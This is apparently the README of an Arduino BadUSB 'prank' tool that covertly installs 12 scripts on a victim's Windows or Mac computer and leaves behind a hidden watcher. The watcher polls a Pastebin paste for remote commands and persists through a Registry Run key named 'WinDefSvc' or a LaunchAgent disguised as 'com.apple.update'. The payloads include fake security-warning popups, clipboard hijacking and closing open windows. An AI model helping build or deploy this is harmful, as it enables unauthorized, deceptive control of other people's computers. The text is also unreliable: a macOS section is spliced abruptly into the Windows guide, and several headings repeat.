# Windows Ultimate Prank — Arduino Pro Micro / Leonardo

Silently installs 12 background prank scripts the moment it's plugged in. Nothing happens immediately — you trigger pranks remotely by updating a Pastebin paste whenever you're ready.

---

## Hardware Required

- Arduino Pro Micro **or** Arduino Leonardo
- USB cable (plug into target's Windows PC)

---

## Setup

### 1. Create your own Pastebin

1. Go to [pastebin.com](https://pastebin.com) and create a **free account**
2. Click **New Paste**
3. Leave the content **blank** for now (or type anything that isn't a command word)
4. Set expiry to **Never** and visibility to **Public**
5. Click **Create New Paste**
6. Copy the 8-character ID from the URL — e.g. `pastebin.com/raw/XXXXXXXX` → your ID is `XXXXXXXX`

### 2. Add your Pastebin ID to the sketch

Open `sketch.ino` and find this line in the trigger section:

```
typeln("'URL=''https://pastebin.com/raw/XXXXXXXX''' | ac $f");
```

Replace `XXXXXXXX` with your actual Pastebin ID.

### 3. Flash the sketch

1. Open `sketch.ino` in the Arduino IDE
2. Set **Tools → Board** to `Arduino Leonardo` or `Arduino Pro Micro`
3. Set the correct **Port**
4. Click **Upload**

### 4. Plug into target PC

- Plug the Arduino into the target Windows machine
- Wait ~10 seconds — a PowerShell window flickers briefly then closes
- All 12 prank scripts are now silently installed in `%APPDATA%`
- A hidden background watcher starts, checking your Pastebin every 5 minutes
- Remove the Arduino — the victim has no idea anything happened

---

## Triggering Pranks

Go to your Pastebin paste, click **Edit**, type **one of the command words** below, and save. The watcher checks every 5 minutes and launches the matching prank automatically.

| Command | What happens |
|---|---|
| `ACTIVATE` | Launches **all 12 pranks** simultaneously |
| `JIGGLE` | Mouse teleports to a random position every 60 seconds |
| `MINIMISE` | Win+M minimises all windows every 3 minutes |
| `SOUND` | Random Windows system beep every 60 seconds |
| `NOTIFY` | Fake "Critical Error / Security Warning" popup every 3 minutes |
| `CLIPBOARD` | Replaces clipboard with "what did you copy", "nice try"... every 45 seconds |
| `ZOOM` | Ctrl+= zooms in on everything every 90 seconds |
| `CAPS` | Caps lock toggled every 60 seconds |
| `VOLUME` | Volume randomly spiked up or down every 60 seconds |
| `CLOSE` | Alt+F4 closes the foreground window every 4 minutes |
| `SPEECH` | PC speaks out loud: "Hi", "Message from PC", "Can you hear me"... every 2 minutes |
| `DARK` | Dark/light mode flips every 5 minutes |
| `SCROLL` | Wild random scroll jump every 45 seconds |
| `STOP` | Kills all pranks, removes Registry persistence, deletes all script files |

---

## How Persistence Works

On first run, the watcher script (`%APPDATA%\.t.py`) adds itself to the Windows Registry Run key under the name `WinDefSvc`. It restarts automatically after every reboot until you send `STOP`.

---

## Stopping Everything

Put `STOP` in your Pastebin paste. Within 5 minutes the watcher will:
- Remove the `WinDefSvc` Registry Run key
- Kill all running `pythonw.exe` processes
- Delete all 13 hidden `.py` files from `%APPDATA%`

---

## Requirements on Target PC

- Windows 10 or 11
- Python must be installed (check with `python --version` in CMD)
- No pip installs needed — all pranks use only Python's built-in libraries (`ctypes`, `winsound`, `winreg`, `subprocess`)
| `VOLUME` | Output volume set to a random level every 60 seconds |
| `CLOSE` | Cmd+W closes the frontmost tab/window every 4 minutes |
| `SPEECH` | Mac speaks out loud: "Hi", "Message from PC", "Can you hear me"... every 2 minutes |
| `DARK` | Dark/light mode flips every 5 minutes |
| `INVERT` | Display colours inverted (Cmd+Option+Ctrl+8) every 5 minutes |
| `STOP` | Kills all pranks, removes LaunchAgent, deletes all script files |

---

## How Persistence Works

On first run, the watcher script (`/tmp/.t.py`) installs itself as a LaunchAgent at:

```
~/Library/LaunchAgents/com.apple.update.plist
```

It restarts automatically after every login until you send `STOP`.

---

## Stopping Everything

Put `STOP` in your Pastebin paste. Within 5 minutes the watcher will:
- Unload and delete the `com.apple.update` LaunchAgent
- Kill all running prank Python processes (`pkill -f`)
- Delete all 13 hidden `.py` files from `/tmp/`

---

## Requirements on Target Mac

- macOS 10.15 (Catalina) or later
- Python 3 must be installed — it ships with Xcode Command Line Tools. If not present, macOS will prompt to install it automatically when Terminal runs
- Internet connection required on first plug-in (for `pyobjc-framework-Quartz`)
- **System Events automation permission** — macOS may prompt the first time a prank tries to control the keyboard/mouse. If the target dismisses the prompt, keyboard/mouse pranks (MINIMISE, ZOOM, CAPS, CLOSE, INVERT) will silently fail but all others still work
